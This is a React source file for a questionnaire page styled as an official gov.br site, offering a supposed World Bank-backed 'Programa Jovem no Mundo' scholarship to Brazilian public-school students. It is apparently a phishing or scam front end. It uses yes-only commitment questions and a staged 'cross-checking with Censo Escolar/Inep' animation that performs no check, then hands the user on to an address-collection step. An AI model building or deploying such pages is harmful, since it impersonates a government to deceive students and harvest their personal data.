import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const QUESTIONS = [
  {
    id: 1,
    text: 'Você estuda ou já concluiu o ensino em escola da rede pública?',
    context:
      'O Programa Jovem no Mundo é uma iniciativa de incentivo exclusivo para estudantes do sistema público brasileiro.',
    options: [
      { value: 'sim_cursando', text: 'Sim, estou cursando o ensino médio/fundamental' },
      { value: 'sim_superior', text: 'Sim, estou cursando o ensino superior' },
      { value: 'sim_concluido', text: 'Sim, já concluí o ensino médio/fundamental' },
    ],
  },
  {
    id: 2,
    text: 'Como você avalia seu desempenho escolar médio?',
    context:
      'O Banco Mundial prioriza estudantes com frequência regular e aproveitamento satisfatório.',
    options: [
      { value: 'alto', text: 'Excelente (Média 8.0 a 10.0)' },
      { value: 'medio', text: 'Bom (Média 6.0 a 7.9)' },
      { value: 'baixo', text: 'Regular (Média 5.0 a 5.9)' },
    ],
  },
  {
    id: 3,
    text: 'Qual seu nível de domínio do idioma inglês?',
    context:
      'Utilizamos essa informação para direcionar você ao país com melhor grade de ensino para seu perfil.',
    options: [
      { value: 'basico', text: 'Básico ou Iniciante' },
      { value: 'intermediario', text: 'Intermediário' },
      { value: 'avancado', text: 'Avançado ou Fluente' },
    ],
  },
  {
    id: 4,
    text: 'Qual a duração pretendida para o intercâmbio tecnológico?',
    context:
      'Bolsas integrais variam entre imersões de curto prazo e formação acadêmica completa.',
    options: [
      { value: '6meses', text: '6 Meses (Semestre Acadêmico)' },
      { value: '1ano', text: '1 Ano (Ano Acadêmico)' },
      { value: '2anos', text: '2 Anos (Formação Tecnológica)' },
    ],
  },
  {
    id: 5,
    text: 'Você possui passaporte brasileiro com validade mínima de 6 meses?',
    context:
      'Caso não possua, o programa arca com as taxas de emissão após a aprovação.',
    options: [
      { value: 'sim', text: 'Sim, possuo passaporte válido' },
      { value: 'nao', text: 'Não possuo passaporte' },
      { value: 'vencido', text: 'Possuo mas está vencido' },
    ],
  },
  {
    id: 6,
    text: 'Você concorda que a educação internacional de elite deve ser acessível a todos os brasileiros, independente de renda?',
    context:
      'O Programa Jovem no Mundo democratiza o acesso ao conhecimento global para todos.',
    options: [
      { value: 'concordo', text: 'Sim, concordo totalmente' },
      { value: 'parcial', text: 'Sim, é um direito fundamental' },
    ],
  },
  {
    id: 7,
    text: 'Você se compromete a honrar as cores do Brasil e aplicar o conhecimento adquirido para o desenvolvimento nacional?',
    context:
      'Buscamos representantes patriotas que impulsionem a inovação em nosso território.',
    options: [
      { value: 'comprometo', text: 'Sim, assumo o compromisso' },
      { value: 'honra', text: 'Sim, com total honra e seriedade' },
    ],
  },
  {
    id: 8,
    text: 'O quanto você se sente preparado para realizar essa mudança de vida ainda em 2026?',
    context:
      'A maturação do processo seletivo exige foco total no ciclo acadêmico de 2026.',
    options: [
      { value: 'preparado', text: 'Totalmente preparado e motivado' },
      { value: 'focado', text: 'Focado e pronto para o embarque' },
    ],
  },
]

export default function Questionario() {
  const navigate = useNavigate()
  const [step, setStep] = useState(0)
  const [answers, setAnswers] = useState({})
  const [calculating, setCalculating] = useState(false)
  const [logs, setLogs] = useState({ l1: false, l2: false, l3: false })

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    if (!calculating) return
    const t1 = setTimeout(() => setLogs((p) => ({ ...p, l1: true })), 1000)
    const t2 = setTimeout(() => setLogs((p) => ({ ...p, l2: true })), 2000)
    const t3 = setTimeout(() => setLogs((p) => ({ ...p, l3: true })), 3000)
    const t4 = setTimeout(() => {
      localStorage.setItem('questionnaire', JSON.stringify(answers))
      navigate('/endereco')
    }, 4500)
    return () => {
      clearTimeout(t1)
      clearTimeout(t2)
      clearTimeout(t3)
      clearTimeout(t4)
    }
  }, [calculating, navigate, answers])

  const current = QUESTIONS[step]
  const total = QUESTIONS.length
  const percent = Math.round(((step + 1) / total) * 100)
  const selected = answers[current?.id]

  function select(value) {
    setAnswers((p) => ({ ...p, [current.id]: value }))
  }

  function next() {
    if (step + 1 < QUESTIONS.length) {
      setStep(step + 1)
    } else {
      setCalculating(true)
    }
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Assuntos</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Notícias</a>
          <span>&gt;</span>
          <span className="text-gray-500">Questionário Acadêmico</span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 850,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
          }}
        >
          {!calculating && (
            <>
              <div className="mb-10">
                <div className="flex justify-between text-[11px] font-black text-gray-400 mb-2 uppercase tracking-wider">
                  <span>
                    Etapa de Seleção: {step + 1} / {total}
                  </span>
                  <span>{percent}%</span>
                </div>
                <div style={{ height: 4, background: '#e5e7eb', borderRadius: 2 }}>
                  <div
                    style={{
                      height: '100%',
                      background: '#1351b4',
                      width: `${percent}%`,
                      borderRadius: 2,
                      transition: 'width 0.3s',
                    }}
                  />
                </div>
              </div>

              <h2
                style={{
                  fontSize: 26,
                  fontWeight: 900,
                  color: '#004587',
                  marginBottom: 30,
                  lineHeight: 1.2,
                }}
              >
                {current.text}
              </h2>

              <div
                style={{
                  background: '#f1f5f9',
                  borderLeft: '4px solid #004587',
                  padding: 15,
                  marginBottom: 25,
                  fontSize: 15,
                  color: '#475569',
                }}
              >
                {current.context}
              </div>

              <div className="space-y-3">
                {current.options.map((opt) => {
                  const isSel = selected === opt.value
                  return (
                    <div
                      key={opt.value}
                      onClick={() => select(opt.value)}
                      style={{
                        border: `1px solid ${isSel ? '#1351b4' : '#e2e8f0'}`,
                        borderRadius: 4,
                        padding: 15,
                        marginBottom: 12,
                        cursor: 'pointer',
                        transition: 'all 0.2s',
                        display: 'flex',
                        alignItems: 'center',
                        gap: 15,
                        background: isSel ? '#eff6ff' : 'white',
                        boxShadow: isSel ? '0 0 0 1px #1351b4' : 'none',
                      }}
                    >
                      <div
                        style={{
                          width: 18,
                          height: 18,
                          border: `2px solid ${isSel ? '#1351b4' : '#cbd5e1'}`,
                          borderRadius: '50%',
                          position: 'relative',
                          flexShrink: 0,
                        }}
                      >
                        {isSel && (
                          <div
                            style={{
                              position: 'absolute',
                              top: 3,
                              left: 3,
                              width: 8,
                              height: 8,
                              background: '#1351b4',
                              borderRadius: '50%',
                            }}
                          />
                        )}
                      </div>
                      <span className="font-bold text-gray-700">{opt.text}</span>
                    </div>
                  )
                })}
              </div>

              <button
                disabled={!selected}
                onClick={next}
                style={{
                  backgroundColor: selected ? '#1351b4' : '#9ca3af',
                  color: 'white',
                  padding: 14,
                  borderRadius: 30,
                  fontWeight: 'bold',
                  width: '100%',
                  marginTop: 30,
                  textTransform: 'uppercase',
                  border: 'none',
                  cursor: selected ? 'pointer' : 'not-allowed',
                }}
              >
                {step + 1 < total ? 'Prosseguir com Inscrição' : 'Finalizar Questionário'}
              </button>
            </>
          )}

          {calculating && (
            <div className="py-20 text-center">
              <div className="flex justify-center mb-10">
                <div
                  style={{
                    position: 'relative',
                    width: 96,
                    height: 96,
                  }}
                >
                  <div
                    style={{
                      position: 'absolute',
                      inset: 0,
                      border: '4px solid #dbeafe',
                      borderRadius: '50%',
                    }}
                  />
                  <div
                    style={{
                      position: 'absolute',
                      inset: 0,
                      border: '4px solid #2563eb',
                      borderTopColor: 'transparent',
                      borderRadius: '50%',
                      animation: 'spin 1s linear infinite',
                    }}
                  />
                </div>
              </div>
              <h2 className="text-2xl font-black text-blue-900 mb-4 uppercase">
                Processando Candidatura
              </h2>
              <p className="text-xs text-gray-500 font-bold uppercase tracking-widest mb-10">
                Cruzando dados com Censo Escolar/Inep...
              </p>
              <div style={{ maxWidth: 300, margin: '0 auto' }} className="space-y-3 text-left">
                {[
                  { key: 'l1', label: 'ANALISANDO RENDIMENTO ACADÊMICO...' },
                  { key: 'l2', label: 'VERIFICANDO VÍNCULO EM REDE PÚBLICA...' },
                  { key: 'l3', label: 'CONSULTANDO DISPONIBILIDADE NO DESTINO...' },
                ].map((l) => (
                  <div
                    key={l.key}
                    className="text-[10px] font-bold text-gray-400 flex items-center gap-2"
                    style={{
                      opacity: logs[l.key] ? 1 : 0,
                      transition: 'opacity 0.3s',
                    }}
                  >
                    <span
                      style={{
                        width: 6,
                        height: 6,
                        background: '#22c55e',
                        borderRadius: '50%',
                        display: 'inline-block',
                      }}
                    />
                    {l.label}
                  </div>
                ))}
              </div>
              <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
            </div>
          )}
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
